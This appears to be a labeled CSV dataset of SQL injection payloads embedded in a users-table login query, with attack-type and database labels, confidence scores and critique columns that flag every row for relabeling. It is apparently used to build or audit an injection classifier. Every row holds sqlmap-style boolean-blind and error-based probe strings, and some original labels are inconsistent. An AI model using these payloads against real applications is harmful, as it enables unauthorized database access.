id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
37810,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'cbnc\' like \'cbnc"" and username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'cbnc\' like \'cbnc"" and username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37811,"select * from users WHERE username = ""-8860 ) and username = ""-2756\' where 6156 = 6156 and username = ""1 ) ) and ( ( 5139 = 5139""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-8860 ) and username = ""-2756\' where 6156 = 6156 and username = ""1 ) ) and ( ( 5139 = 5139",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37812,"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) ) and username = ""-5863"" and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) ) and username = ""-5863"" and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
37813,"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1\'",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1\'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37814,"select * from users WHERE username = ""-1549\' ) or username = ""-6523"" and username = ""-7242\' and \'kfff\' = \'kfff""",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,"-1549\' ) or username = ""-6523"" and username = ""-7242\' and \'kfff\' = \'kfff",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37815,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'cgiu\' = \'cgiu"" or username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37816,"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" and username = ""-7710\' where 5658 = 5658",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" and username = ""-7710\' where 5658 = 5658",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37817,"select * from users WHERE username = ""1\' ) ) and ( ( \'opyp\' = \'opyp"" or username = ""-1549\' ) and ( \'fnwx\' = \'fnwx""",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,-1549\' ) and ( \'fnwx\' = \'fnwx,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37818,"select * from users WHERE username = ""-6244\' ) as szpd where 8445 = 8445 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"" or username = ""-5863""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-6244\' ) as szpd where 8445 = 8445 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37819,"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
37820,"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1\' ) ) and ( ( \'rggg\' = \'rggg""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1%\' ) ) and ( ( \'%\' = \'"" or username = ""1\' ) ) and ( ( \'rggg\' = \'rggg",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37821,"select * from users WHERE username = ""1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548"" or username = ""-6190\' ) where 2621 = 2621",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548"" or username = ""-6190\' ) where 2621 = 2621",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37822,"select * from users WHERE username = ""-2374 ) and ( ( \'dyuo\' = \'dyuo"" or username = ""-9644 ) ) and ( ( 5616 = 5616""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,-2374 ) and ( ( \'dyuo\' = \'dyuo,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37823,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" or username = ""1\'+ ( select \'ueak\' where 7329 = 7329",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" or username = ""1\'+ ( select \'ueak\' where 7329 = 7329",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37824,"select * from users WHERE username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu"" or username = ""1\'|| ( select \'rjun\' where 8868 = 8868",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu"" or username = ""1\'|| ( select \'rjun\' where 8868 = 8868",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37825,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254"" and username = ""1%\' ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254"" and username = ""1%\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37826,"select * from users WHERE username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
37827,"select * from users WHERE username = ""-1254"" and username = ""1 ) where 3381 = 3381 and username = ""1%\' ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-1254"" and username = ""1 ) where 3381 = 3381 and username = ""1%\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37828,"select * from users WHERE username = ""-5863"" and username = ""-5217 where 3620 = 3620 or username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-5217 where 3620 = 3620 or username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37829,"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" and username = ""-9564",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" and username = ""-9564",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37830,"select * from users WHERE username = ""-7746\' ) ) ) and username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-7746\' ) ) ) and username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37831,"select * from users WHERE username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37832,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select oljg where 2006 = 2006",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select oljg where 2006 = 2006",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37833,"select * from users WHERE username = ""-4610\' ) ) and username = ""-3899\' ) where 8152 = 8152 and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-4610\' ) ) and username = ""-3899\' ) where 8152 = 8152 and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37834,"select * from users WHERE username = ""-3880 ) and ( 5194 = 5194"" and username = ""1%\' ) ) ) or username = ""-1254""",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,"1%\' ) ) ) or username = ""-1254",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37835,"select * from users WHERE username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""1%\' and \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-4322\' ) ) as magw where 1627 = 1627 or username = ""1%\' and \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37836,"select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37837,"select * from users WHERE username = ""-8099%\' ) ) and ( ( \'%\' = \'"" and username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,1\' ) ) ) and ( ( ( \'xpks\' like \'xpks,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37838,"select * from users WHERE username = ""-6244\' ) as szpd where 8445 = 8445 and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and \'nmdq\' like \'nmdq""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-6244\' ) as szpd where 8445 = 8445 and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and \'nmdq\' like \'nmdq",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37839,"select * from users WHERE username = ""1\' ) ) ) or username = ""-1254"" or username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) ) ) or username = ""-1254"" or username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37840,"select * from users WHERE username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap"" and username = ""1 where 5161 = 5161",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap"" and username = ""1 where 5161 = 5161",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37841,"select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""-2962\' ) ) )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""-2962\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37842,"select * from users WHERE username = ""1%"" and username = ""1\' ) ) and ( ( \'mmow\' = \'mmow""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,1\' ) ) and ( ( \'mmow\' = \'mmow,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37843,"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""-6523"" and \'kfff\' = \'kfff""",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,"-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""-6523"" and \'kfff\' = \'kfff",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
